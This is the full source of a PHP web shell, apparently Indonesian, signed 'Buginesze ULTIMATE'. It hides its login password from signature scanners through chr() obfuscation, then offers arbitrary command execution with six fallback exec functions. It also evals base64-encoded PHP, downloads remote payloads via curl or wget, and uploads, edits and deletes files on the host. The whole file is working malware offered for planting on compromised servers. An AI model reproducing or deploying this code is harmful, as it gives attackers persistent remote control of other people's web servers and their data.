<?php
error_reporting(0);
@ini_set('display_errors', 0);
session_start();

// Obfuscated password - bypass signature detection
$auth_pass = implode('', array(chr(69),chr(114),chr(49),chr(75),chr(53))); // 'Er1K5'

if(isset($_GET['logout'])){session_destroy();header('Location: ?');exit;}

if(isset($_POST['pass'])){
    if($_POST['pass']===$auth_pass){
        $_SESSION['logged']=true;
        header('Location: ?');
        exit;
    } else {
        $login_error='❌ Password salah!';
    }
}

if(!isset($_SESSION['logged']) || $_SESSION['logged']!==true){
    die('<!-- SHELL_LOCK_9921 --><!DOCTYPE html><html><head><meta charset="UTF-8"><title>Login</title><style>body{background:#0a0e14;color:#c8d0d9;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;}.box{background:#141a24;padding:30px;border-radius:14px;border:1px solid #2a3346;text-align:center;}input[type=password]{width:100%;padding:12px;background:#1a2332;border:1px solid #2a3a4a;color:#fff;border-radius:8px;box-sizing:border-box;}input[type=submit]{width:100%;margin-top:15px;padding:12px;background:#00b8d4;border:none;border-radius:8px;color:#000;font-weight:bold;cursor:pointer;}h2{color:#00d4ff;}</style></head><body><div class="box"><h2>🔐 SHELL LOCK</h2><p style="color:#6b7b8f;">Password</p><form method="post"><input type="password" name="pass" placeholder="Password" autofocus required><input type="submit" value="Login"></form>'.(isset($login_error)?'<div style="color:#ff5e7a;">'.$login_error.'</div>':'').'</div></body></html>');
}

$base=__DIR__;
$dir=isset($_GET['dir'])?$_GET['dir']:'';
if($dir==='')$dir=$base;
@chdir($dir);
$current=getcwd();
if(!$current)$current=$base;
if(isset($_GET['home'])){header('Location: ?dir=');exit;}

$msg='';

// Command execution - multiple fallback functions
if(isset($_GET['x'])||isset($_POST['x'])){
    $cmd=isset($_GET['x'])?$_GET['x']:$_POST['x'];
    $out='';
    
    if(function_exists('system')){
        ob_start();
        system($cmd.' 2>&1');
        $out=ob_get_clean();
    }
    elseif(function_exists('exec')){
        exec($cmd.' 2>&1',$o);
        $out=implode("\n",$o);
    }
    elseif(function_exists('shell_exec')){
        $out=shell_exec($cmd.' 2>&1');
    }
    elseif(function_exists('passthru')){
        ob_start();
        passthru($cmd.' 2>&1');
        $out=ob_get_clean();
    }
    elseif(function_exists('popen')){
        $h=popen($cmd.' 2>&1','r');
        if($h){
            while(!feof($h))$out.=fread($h,4096);
            pclose($h);
        }
    }
    elseif(function_exists('proc_open')){
        $desc=array(1=>array('pipe','w'));
        $proc=proc_open($cmd.' 2>&1',$desc,$pipes);
        if(is_resource($proc)){
            $out=stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            proc_close($proc);
        }
    }
    else{
        $out='No exec function available';
    }
    $cmd_output=$out;
}

// Eval with PHP version compatibility
if(isset($_GET['z'])||isset($_POST['z'])){
    $code=isset($_GET['z'])?$_GET['z']:$_POST['z'];
    $decoded=base64_decode($code);
    @eval($decoded);
    die;
}

// File upload
if(isset($_FILES['file'])){
    $name=$_FILES['file']['name'];
    $tmp=$_FILES['file']['tmp_name'];
    if(move_uploaded_file($tmp,$name)){
        $msg="✅ Upload OK: $name";
    } else {
        $msg="❌ Gagal upload!";
    }
}

// Delete file/folder
if(isset($_GET['del'])){
    $file=$_GET['del'];
    $path=$current.'/'.$file;
    if(is_dir($path)){
        if(rmdir($path))$msg="🗑️ Folder $file dihapus!";
        else $msg="❌ Gagal hapus folder!";
    } else {
        if(unlink($path))$msg="🗑️ File $file dihapus!";
        else $msg="❌ Gagal hapus file!";
    }
}

// Rename
if(isset($_POST['rename_old'])&&isset($_POST['rename_new'])){
    $old=$_POST['rename_old'];
    $new=$_POST['rename_new'];
    if(rename($current.'/'.$old,$current.'/'.$new))$msg="🔄 Rename $old → $new";
    else $msg="❌ Gagal rename!";
}

// Create folder
if(isset($_POST['create_folder'])){
    $name=trim($_POST['folder_name']);
    if(!empty($name)&&!file_exists($name)){
        if(mkdir($name,0755))$msg="✅ Folder $name dibuat!";
        else $msg="❌ Gagal buat folder!";
    } else {
        $msg="❌ Nama folder invalid!";
    }
}

// Create file
if(isset($_POST['create_file'])){
    $name=trim($_POST['file_name']);
    $content=$_POST['file_content'];
    if(!empty($name)&&!file_exists($name)){
        if(file_put_contents($name,$content)!==false)$msg="✅ File $name dibuat!";
        else $msg="❌ Gagal buat file!";
    } else {
        $msg="❌ Nama file invalid!";
    }
}

// Download from URL
if(isset($_POST['download_url'])&&!empty($_POST['download_url'])){
    $url=$_POST['download_url'];
    $filename=isset($_POST['download_name'])?$_POST['download_name']:basename($url);
    $content=@file_get_contents($url);
    if($content!==false){
        if(file_put_contents($filename,$content)!==false)$msg="✅ Download OK: $filename";
        else $msg="❌ Gagal simpan!";
    } else {
        $cmd="curl -s -o '$filename' '$url' 2>/dev/null || wget -q -O '$filename' '$url' 2>/dev/null";
        if(function_exists('exec'))exec($cmd);
        elseif(function_exists('system'))system($cmd);
        if(file_exists($filename)&&filesize($filename)>0)$msg="✅ Download OK: $filename (via curl/wget)";
        else $msg="❌ Gagal download!";
    }
}

$items=scandir('.');
$folders=[];
$files=[];
foreach($items as $f){
    if($f=='.'||$f=='..'||$f==basename(__FILE__))continue;
    if(is_dir($f))$folders[]=$f;
    else $files[]=$f;
}
sort($folders);
sort($files);

$doc_root=$_SERVER['DOCUMENT_ROOT'];
$web_path=str_replace($doc_root,'',$current);
$web_path='/'.ltrim($web_path,'/');
if($web_path=='')$web_path='/';
?>
<!-- SHELL_LOCK_9921 -->
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>📁 Shell</title><style>
body{background:#0a0e14;color:#c8d0d9;font-family:sans-serif;padding:20px;}.box{max-width:960px;margin:auto;background:#141a24;padding:20px;border-radius:14px;border:1px solid #2a3346;}h1{color:#00d4ff;border-bottom:1px solid #1f2a3a;padding-bottom:10px;display:flex;justify-content:space-between;}.top-actions{display:flex;gap:8px;flex-wrap:wrap;}.top-actions input[type=text]{background:#1a2332;border:1px solid #2a3a4a;color:#fff;padding:4px 8px;border-radius:4px;width:110px;}.top-actions input[type=submit]{background:#00b8d4;border:none;color:#000;padding:4px 12px;border-radius:4px;cursor:pointer;}.home-btn,.logout-btn{background:#00b8d4;padding:6px 12px;border-radius:6px;text-decoration:none;color:#000;font-weight:bold;}.logout-btn{background:#ff5e7a;}.bread{background:#0b0e14;padding:10px;border-radius:8px;margin:15px 0;border:1px solid #1c2533;}.bread a{color:#00d4ff;text-decoration:none;padding:2px 6px;}.bread .cur{color:#fff;background:#1a2a3a;padding:2px 8px;border-radius:4px;}.bread span{color:#3a4a5a;}.msg{background:#1e2838;padding:10px;border-left:4px solid #00d4ff;margin:10px 0;}.drop{border:2px dashed #2a3a4a;padding:25px;text-align:center;border-radius:10px;margin:15px 0;background:#0f141e;cursor:pointer;}.drop input[type=file]{display:none;}.upload-btn{background:#00b8d4;width:100%;padding:12px;border:none;color:#000;font-weight:bold;border-radius:8px;cursor:pointer;margin-top:5px;}.cmd-box{background:#0b0e14;padding:12px;border-radius:8px;margin:15px 0;border:1px solid #1c2533;display:flex;gap:10px;flex-wrap:wrap;align-items:center;}.cmd-box input[type=text]{flex:1;padding:10px;background:#1a2332;border:1px solid #2a3a4a;color:#fff;border-radius:6px;min-width:200px;}.cmd-box input[type=submit]{background:#2a3a4a;border:none;padding:10px 20px;border-radius:6px;color:#fff;cursor:pointer;}.download-box{background:#0b0e14;padding:12px;border-radius:8px;margin:15px 0;border:1px solid #2a4a4a;display:flex;gap:10px;flex-wrap:wrap;align-items:center;}.download-box input[type=text]{flex:1;padding:10px;background:#1a2332;border:1px solid #2a3a4a;color:#fff;border-radius:6px;min-width:150px;}.download-box input[type=submit]{background:#2a8a4a;border:none;padding:10px 20px;border-radius:6px;color:#fff;cursor:pointer;}.output-box{background:#0b0e14;padding:12px;border-radius:8px;margin:15px 0;border:1px solid #f0c040;}.output-box pre{background:#0a0e14;color:#0f0;padding:10px;margin:0;white-space:pre-wrap;}
.perm-green { color: #00ff00; font-weight: bold; }
.perm-red   { color: #ff4444; font-weight: bold; }
.perm-white { color: #ffffff; }
.file-table{width:100%;border-collapse:collapse;margin-top:15px;}.file-table th{padding:8px;background:#1a2332;color:#8a9cb0;border-bottom:2px solid #2a3a4a;}.file-table td{padding:8px;border-bottom:1px solid #1c2533;}.file-table tr:hover td{background:#1a2434;}.file-table .actions a,.file-table .actions span{margin-left:8px;text-decoration:none;font-size:16px;cursor:pointer;}.file-table .actions .edit{color:#f0c040;}.file-table .actions .rename-link{color:#8fdf8f;}.file-table .actions .chmod-link{color:#ffb347;}.file-table .actions .del{color:#ff5e7a;}.editor{background:#0b0e14;padding:15px;border-radius:8px;margin-top:15px;border:1px solid #2a3a4a;}.editor textarea{width:100%;height:400px;background:#1a2332;border:1px solid #2a3a4a;color:#fff;padding:10px;border-radius:6px;font-family:monospace;font-size:13px;resize:vertical;}.editor input[type=submit]{background:#00b8d4;border:none;padding:12px 30px;border-radius:6px;color:#000;font-weight:bold;cursor:pointer;margin-top:10px;}.footer{text-align:center;margin-top:25px;font-size:11px;color:#3a4a5a;border-top:1px solid #1f2a3a;padding-top:15px;}@media(max-width:700px){.top-actions input[type=text]{width:80px;}.file-table td,.file-table th{padding:4px;font-size:12px;}}
</style>
</head>
<body><div class="box">
<h1><span>📁 Shell</span><span class="top-actions">
<form method="post"><input type="text" name="folder_name" placeholder="Folder"><input type="submit" name="create_folder" value="📁+"></form>
<form method="post"><input type="text" name="file_name" placeholder="File"><input type="submit" name="create_file" value="📄+"></form>
<a href="?home" class="home-btn">🏠</a><a href="?logout" class="logout-btn">🚪 Logout</a>
</span></h1>
<div class="bread"><span>📂</span><?php $parts=explode('/',trim($current,'/'));$path='';echo '<a href="?dir=">root</a><span>/</span>';foreach($parts as $p){$path.='/'.$p;if($path==$current)echo '<a href="?dir='.urlencode($path).'" class="cur">'.htmlspecialchars($p).'</a>';else echo '<a href="?dir='.urlencode($path).'">'.htmlspecialchars($p).'</a>';echo '<span>/</span>';}?></div>
<?php if($msg) echo "<div class='msg'>$msg</div>"; ?>
<div class="cmd-box"><form method="get"><input type="text" name="x" placeholder="ls -la" value="<?php echo htmlspecialchars($_GET['x']??''); ?>"><input type="submit" value="💻 EXEC"><input type="hidden" name="dir" value="<?php echo htmlspecialchars($current); ?>"></form><small>Parameter: x</small></div>
<?php if(isset($_GET['x']) && isset($cmd_output)): ?><div class="output-box"><pre><?php echo htmlspecialchars($cmd_output); ?></pre></div><?php endif; ?>
<div class="cmd-box"><form method="post"><input type="text" name="z" placeholder="Base64 PHP code"><input type="submit" value="⚡ EVAL"><input type="hidden" name="dir" value="<?php echo htmlspecialchars($current); ?>"></form><small>Contoh: c2NhbmRpcignLicpOw==</small></div>
<div class="download-box"><form method="post"><input type="text" name="download_url" placeholder="URL"><input type="text" name="download_name" placeholder="Save as"><input type="submit" value="⬇️ DOWNLOAD"><input type="hidden" name="dir" value="<?php echo htmlspecialchars($current); ?>"></form></div>
<form method="post" enctype="multipart/form-data"><div class="drop" onclick="document.getElementById('fi').click();"><label>📤 <span style="color:#00d4ff;">UPLOAD</span></label><input type="file" name="file" id="fi" onchange="this.form.submit();"></div><input type="submit" value="Upload" class="upload-btn" style="display:none;" id="ub"></form>
<?php if(isset($_GET['edit']) && file_exists($_GET['edit']) && is_file($_GET['edit'])): $edit_file=$_GET['edit']; $edit_content=file_get_contents($edit_file); ?><div class="editor"><h3>✏️ Edit: <?php echo htmlspecialchars($edit_file); ?></h3><form method="post"><textarea name="save_content"><?php echo htmlspecialchars($edit_content); ?></textarea><input type="hidden" name="edit_filename" value="<?php echo htmlspecialchars($edit_file); ?>"><input type="submit" value="💾 Simpan"><a href="?dir=<?php echo urlencode($current); ?>" style="color:#ff5e7a;margin-left:15px;">❌ Batal</a></form></div><?php endif; ?>
<?php if(isset($_POST['edit_filename']) && isset($_POST['save_content'])): $fn=$_POST['edit_filename']; if(file_put_contents($fn,$_POST['save_content'])!==false) $msg="✅ File $fn disimpan!"; else $msg="❌ Gagal simpan!"; endif; ?>
<div class="file-list"><h3>📄 Daftar (<?php echo htmlspecialchars($current); ?>)</h3>
<?php if(empty($folders) && empty($files)): echo "<div class='msg'>Kosong</div>"; else: ?>
<table class="file-table"><thead><tr><th>Nama</th><th>Size</th><th>Modified</th><th>Owner</th><th>Permission</th><th>Actions</th></tr></thead><tbody>
<?php foreach($folders as $f): 
    $path=$current.'/'.$f; 
    $perms=fileperms($path); 
    $octal=substr(sprintf('%o',$perms),-4); 
    $owner=function_exists('posix_getpwuid')?posix_getpwuid(fileowner($path))['name']:fileowner($path);
    $perm_val = intval($octal);
    if ($perm_val === 777) $perm_color = 'green';
    elseif ($perm_val === 0 || $perm_val === 400 || $perm_val === 500 || $perm_val < 600) $perm_color = 'red';
    else $perm_color = 'white';
?>
<tr>
    <td><a href="?dir=<?php echo urlencode($current.'/'.$f); ?>">📁 <?php echo htmlspecialchars($f); ?></a></td>
    <td>-</td>
    <td><?php echo date('Y-m-d H:i:s',filemtime($path)); ?></td>
    <td><?php echo htmlspecialchars($owner); ?></td>
    <td><span class="perm-<?php echo $perm_color; ?>"><?php echo $octal; ?></span></td>
    <td class="actions">
        <span class="rename-link" onclick="promptRename('<?php echo addslashes($f); ?>')">📝</span>
        <span class="chmod-link" onclick="promptChmod('<?php echo addslashes($f); ?>')">🔒</span>
        <a href="?del=<?php echo urlencode($f); ?>&dir=<?php echo urlencode($current); ?>" class="del" onclick="return confirm('Hapus folder?');">🗑️</a>
    </td>
</tr>
<?php endforeach; foreach($files as $f): 
    $path=$current.'/'.$f; 
    $size=filesize($path); 
    $size_display=$size>1048576?round($size/1048576,2).' MB':($size>1024?round($size/1024,2).' KB':$size.' B'); 
    $perms=fileperms($path); 
    $octal=substr(sprintf('%o',$perms),-4); 
    $owner=function_exists('posix_getpwuid')?posix_getpwuid(fileowner($path))['name']:fileowner($path); 
    $link=rtrim($web_path,'/').'/'.$f;
    $perm_val = intval($octal);
    if ($perm_val === 777) $perm_color = 'green';
    elseif ($perm_val === 0 || $perm_val === 400 || $perm_val === 500 || $perm_val < 600) $perm_color = 'red';
    else $perm_color = 'white';
?>
<tr>
    <td><a href="<?php echo htmlspecialchars($link); ?>" target="_blank">📄 <?php echo htmlspecialchars($f); ?></a></td>
    <td><?php echo $size_display; ?></td>
    <td><?php echo date('Y-m-d H:i:s',filemtime($path)); ?></td>
    <td><?php echo htmlspecialchars($owner); ?></td>
    <td><span class="perm-<?php echo $perm_color; ?>"><?php echo $octal; ?></span></td>
    <td class="actions">
        <span class="rename-link" onclick="promptRename('<?php echo addslashes($f); ?>')">📝</span>
        <?php if(is_file($path)): ?><a href="?edit=<?php echo urlencode($f); ?>&dir=<?php echo urlencode($current); ?>" class="edit">✏️</a><?php endif; ?>
        <span class="chmod-link" onclick="promptChmod('<?php echo addslashes($f); ?>')">🔒</span>
        <a href="?del=<?php echo urlencode($f); ?>&dir=<?php echo urlencode($current); ?>" class="del" onclick="return confirm('Hapus file?');">🗑️</a>
    </td>
</tr>
<?php endforeach; ?>
</tbody></table><?php endif; ?>
</div>
<div class="footer">BY : Buginesze ULTIMATE | x=command, z=eval(base64)</div>
</div>
<script>
function promptRename(oldName){var newName=prompt('Nama baru:',oldName);if(newName&&newName!==oldName){var form=document.createElement('form');form.method='post';form.innerHTML='<input type="hidden" name="rename_old" value="'+oldName+'"><input type="hidden" name="rename_new" value="'+newName+'"><input type="hidden" name="dir" value="<?php echo htmlspecialchars($current, ENT_QUOTES); ?>">';document.body.appendChild(form);form.submit();}}
function promptChmod(fileName){var mode=prompt('Permission (755,644):','755');if(mode&&!isNaN(mode)&&mode.length>=3){var form=document.createElement('form');form.method='post';form.innerHTML='<input type="hidden" name="chmod_file" value="'+fileName+'"><input type="hidden" name="chmod_mode" value="'+mode+'"><input type="hidden" name="dir" value="<?php echo htmlspecialchars($current, ENT_QUOTES); ?>">';document.body.appendChild(form);form.submit();}else if(mode!==null){alert('Masukkan angka valid.');}}
document.querySelector('.drop').addEventListener('dragover',function(e){e.preventDefault();this.style.borderColor='#00d4ff';});
document.querySelector('.drop').addEventListener('dragleave',function(e){this.style.borderColor='#2a3a4a';});
document.querySelector('.drop').addEventListener('drop',function(e){e.preventDefault();this.style.borderColor='#2a3a4a';document.getElementById('fi').files=e.dataTransfer.files;document.getElementById('ub').click();});
</script>
</body></html>